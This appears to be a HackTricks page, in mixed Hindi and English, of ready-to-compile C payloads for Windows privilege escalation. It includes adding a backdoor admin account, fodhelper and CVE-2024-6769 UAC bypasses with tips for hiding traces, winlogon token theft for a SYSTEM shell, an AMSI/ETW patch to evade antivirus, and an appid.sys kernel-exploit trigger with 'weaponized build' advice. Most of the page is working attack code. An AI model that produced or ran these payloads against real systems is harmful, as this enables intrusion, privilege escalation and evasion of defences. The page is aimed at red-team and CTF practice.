# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

यह पेज **छोटे, self-contained C snippets** एकत्र करता है, जो Windows Local Privilege Escalation या post-exploitation के दौरान उपयोगी होते हैं। प्रत्येक payload को **copy-paste friendly** बनाया गया है, इसके लिए केवल Windows API / C runtime की आवश्यकता होती है, और इसे `i686-w64-mingw32-gcc` (x86) या `x86_64-w64-mingw32-gcc` (x64) के साथ compile किया जा सकता है।

> ⚠️  ये payloads मानते हैं कि process के पास action करने के लिए आवश्यक minimum privileges पहले से मौजूद हैं (जैसे `SeDebugPrivilege`, `SeImpersonatePrivilege`, या UAC bypass के लिए medium-integrity context)। इनका उद्देश्य **red-team या CTF settings** में उपयोग करना है, जहाँ किसी vulnerability को exploit करने के बाद arbitrary native code execution प्राप्त हो गया हो।

---

## local administrator user जोड़ें
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
जब trusted binary **`fodhelper.exe`** को execute किया जाता है, तो यह नीचे दिए गए registry path को **`DelegateExecute` verb** को filter किए बिना query करता है। उस key के अंतर्गत अपना command रखकर attacker disk पर कोई file drop किए बिना UAC bypass कर सकता है।<sup>[[1]](#references)</sup>

*`fodhelper.exe` द्वारा query किया गया Registry path*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
एक न्यूनतम PoC जो elevated `cmd.exe` खोलता है:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Windows 10 22H2 और Windows 11 23H2 (July 2025 patches) पर Tested. यह bypass अभी भी काम करता है क्योंकि Microsoft ने `DelegateExecute` path में मौजूद missing integrity check को ठीक नहीं किया है।*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive remapping + activation context cache poisoning patched Windows 10/11 builds के विरुद्ध अभी भी काम करता है क्योंकि `ctfmon.exe` एक high-integrity trusted UI process के रूप में चलता है, जो caller की impersonated `C:` drive से आसानी से load करता है और `CSRSS` द्वारा cached किसी भी DLL redirections का फिर से उपयोग करता है। Abuse इस प्रकार किया जाता है: `C:` को attacker-controlled storage पर re-point करें, एक trojanized `msctf.dll` रखें, high integrity प्राप्त करने के लिए `ctfmon.exe` launch करें, फिर `CSRSS` से ऐसा manifest cache करने को कहें जो किसी auto-elevated binary (जैसे `fodhelper.exe`) द्वारा उपयोग किए जाने वाले DLL को redirect करता हो, ताकि अगला launch बिना UAC prompt के आपके payload को inherit कर ले।<sup>[[5]](#references)</sup>

Practical workflow:
1. एक fake `%SystemRoot%\System32` tree तैयार करें और उस legitimate binary को copy करें जिसे आप hijack करने की योजना बना रहे हैं (अक्सर `ctfmon.exe`)।
2. अपने process के भीतर `C:` को remap करने के लिए `DefineDosDevice(DDD_RAW_TARGET_PATH)` का उपयोग करें और `DDD_NO_BROADCAST_SYSTEM` बनाए रखें, ताकि यह बदलाव local रहे।
3. अपने DLL + manifest को fake tree में रखें, manifest को activation-context cache में push करने के लिए `CreateActCtx/ActivateActCtx` call करें, फिर auto-elevated binary launch करें ताकि वह redirected DLL को सीधे आपके shellcode में resolve करे।
4. समाप्त होने पर attacker fingerprints मिटाने के लिए cache entry (`sxstrace ClearCache`) delete करें या reboot करें।

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Cleanup tip: SYSTEM प्राप्त करने के बाद, testing के दौरान `sxstrace Trace -logfile %TEMP%\sxstrace.etl` चलाएँ और उसके बाद `sxstrace Parse` चलाएँ—यदि log में आपका manifest name दिखाई देता है, तो defenders भी उसे देख सकते हैं, इसलिए हर run में paths बदलते रहें।

---

## token duplication के माध्यम से SYSTEM shell spawn करें (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
यदि current process के पास **दोनों** `SeDebug` और `SeImpersonate` privileges हैं (जो कई service accounts के लिए सामान्य है), तो आप `winlogon.exe` से token चुरा सकते हैं, उसे duplicate कर सकते हैं और एक elevated process शुरू कर सकते हैं:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
यह कैसे काम करता है, इसकी अधिक विस्तृत व्याख्या के लिए देखें:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
अधिकांश आधुनिक AV/EDR engines malicious behaviours का निरीक्षण करने के लिए **AMSI** और **ETW** पर निर्भर करते हैं। वर्तमान process के अंदर दोनों interfaces को पहले ही patch करने से script-based payloads (जैसे PowerShell, JScript) scan होने से बच जाते हैं।<sup>[[2]](#references)</sup>
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*ऊपर दिया गया patch process-local है; इसे चलाने के बाद एक नया PowerShell शुरू करने पर वह AMSI/ETW inspection के बिना execute होगा।*

---

## Protected Process Light (PPL) के रूप में child बनाएँ
`STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL` का उपयोग करके creation के समय child के लिए PPL protection level का अनुरोध करें। यह एक documented API है और केवल तभी सफल होगा जब target image, अनुरोधित signer class (Windows/WindowsLight/Antimalware/LSA/WinTcb) के लिए signed हो।<sup>[[3]](#references)[[4]](#references)</sup>
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
सबसे अधिक सामान्य रूप से उपयोग किए जाने वाले Levels:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Protection column की जाँच करके Process Explorer/Process Hacker से परिणाम को Validate करें।

---

## `appid.sys` Smart-Hash के माध्यम से Local Service -> Kernel (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` एक device object (`\\.\\AppID`) expose करता है, जिसका smart-hash maintenance IOCTL user-supplied function pointers स्वीकार करता है, जब caller `LOCAL SERVICE` के रूप में चलता है; Lazarus इसका उपयोग PPL disable करने और arbitrary drivers load करने के लिए कर रहा है, इसलिए red teams के पास lab use के लिए ready-made trigger होना चाहिए।<sup>[[6]](#references)</sup>

Operational notes:
- आपको अभी भी एक `LOCAL SERVICE` token की आवश्यकता है। `SeImpersonatePrivilege` का उपयोग करके इसे `Schedule` या `WdiServiceHost` से Steal करें, फिर device को access करने से पहले impersonate करें ताकि ACL checks पास हो सकें।
- IOCTL `0x22A018` एक ऐसे struct की अपेक्षा करता है जिसमें दो callback pointers हों (query length + read function)। दोनों को user-mode stubs पर point करें, जो token overwrite या ring-0 primitives map करने के लिए craft किए गए हों, लेकिन buffers को RWX रखें ताकि KernelPatchGuard chain के दौरान crash न करे।
- सफलता के बाद impersonation से बाहर निकलें और device handle को revert करें; defenders अब unexpected `Device\\AppID` handles की तलाश करते हैं, इसलिए privilege मिलने के तुरंत बाद इसे close करें।

<details>
<summary>appid.sys smart-hash abuse के लिए C - Skeleton trigger</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

एक weaponized build के लिए न्यूनतम fix-up: `VirtualAlloc` के साथ एक RWX section map करें, अपना token duplication stub वहां copy करें, `KernelThunk = section` सेट करें, और `DeviceIoControl` के return होने के बाद आपको PPL के अंतर्गत भी SYSTEM मिल जाना चाहिए।

---

## References

- [1] [First entry: Welcome and fileless UAC bypass (fodhelper.exe / ms-settings DelegateExecute)](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)
- [2] [Memory Patching AMSI Bypass](https://rastamouse.me/memory-patching-amsi-bypass/)
- [3] [CreateProcessAsPPL – minimal PPL process launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [4] [UpdateProcThreadAttribute function (Win32 apps) - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)
- [5] [Novel Exploit Chain Enables Windows UAC Bypass](https://www.darkreading.com/vulnerabilities-threats/exploit-chain-windows-uac-bypass)
- [6] [Lazarus and the FudModule Rootkit: Beyond BYOVD with an Admin-to-Kernel Zero-Day](https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day)

{{#include ../../banners/hacktricks-training.md}}
